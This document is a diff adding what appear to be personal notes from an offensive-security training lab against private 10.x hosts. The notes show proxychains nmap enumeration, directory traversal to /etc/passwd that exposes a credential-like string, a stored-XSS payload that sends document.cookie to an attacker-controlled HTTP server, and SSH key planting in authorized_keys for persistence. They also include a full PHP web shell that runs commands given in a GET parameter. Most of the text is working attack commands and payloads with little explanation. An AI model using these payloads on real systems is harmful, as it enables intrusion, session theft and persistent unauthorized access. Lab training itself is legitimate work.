@@ -673,34 +673,114 @@ ssh-keygen -t rsa -b 4096
 
 
 
+# SECURITY DAY 2 (CMD)
 
 
 
+## ENUMERATION
+proxychains nmap 10.100.28.40
+
+Nmap scan report for 10.100.28.40
+Host is up (0.00078s latency).
+Not shown: 998 closed ports
+PORT     STATE SERVICE
+80/tcp   open  http
+4444/tcp open  krb524
+
+proxychains nc 10.100.28.40 4444
+
+SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.3
+
+proxychains nmap -Pn -T5 -sT -p 80 --script http-sql-injection.nse 10.100.28.40
+
+PORT   STATE SERVICE
+80/tcp open  http
+| http-enum: 
+|   /robots.txt: Robots file
+|   /css/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
+|   /images/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
+|_  /uploads/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
+
+proxychains nmap -Pn -T5 -sT -p 80 --script http-robots.txt.nse
+
+PORT   STATE SERVICE
+80/tcp open  http
+| http-robots.txt: 1 disallowed entry 
+|_/net_test
 
 
 
+New IP
+10.100.28.55
+
+User:
+billybob
+
+www-data:x:33:33:www-data:/var/www:/bin/bash
+billybob:x:1001:1001:you found me 1mpriUx44xTsvU8HtOYr:/home/billybob:/bin/bash
+
+Directory Traversal
+Navigate to 10.100.28.55 website
+scroll down and click "here" link
+clip drop down provieded and select random document
+not URL feild for the "=" symbol this will allow you to traverse different directorys via ../../../../../etc/passwd
+
+
+From LinOps
+cd /home
+python3 -m http.server
+
+From Website 
+<script>document.location="http://10.50.38.176:8000/"+document.cookie;</script>
+To get Cookies
+
+
+SSH KEYUPLOAD 
+
+ssh-keygen -t rsa -b 4096
+cat ~/.ssh/id_rsa.pub
+
+ls -la /users/home/directory      #check if .ssh exists
+mkdir /users/home/directory/.ssh   #make .ssh in users home folder if it does not exist
+
+echo "your_public_key_here" >> /users/home/directory/.ssh/authorized_keys
+
+SSH INTO MACHINE
 
 
 
+## MALICIOUS FILE UPLOAD
+
+Server doesn’t validate extension or size
+
+Allows for code execution (shell)
+
+Once uploaded
+
+Find your file
+
+Call your file
+
+
+  <HTML><BODY>
+  <FORM METHOD="GET" NAME="myform" ACTION="">
+  <INPUT TYPE="text" NAME="cmd">
+  <INPUT TYPE="submit" VALUE="Send">
+  </FORM>
+  <pre>
+  <?php
+  if($_GET['cmd']) {
+    system($_GET['cmd']);
+    }
+  ?>
+  </pre>
+  </BODY></HTML>
 
 
 
+## SERVER SIDE INJECTION (CMD)
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+view_image.php?file=../../etc/passwd
 
 
 
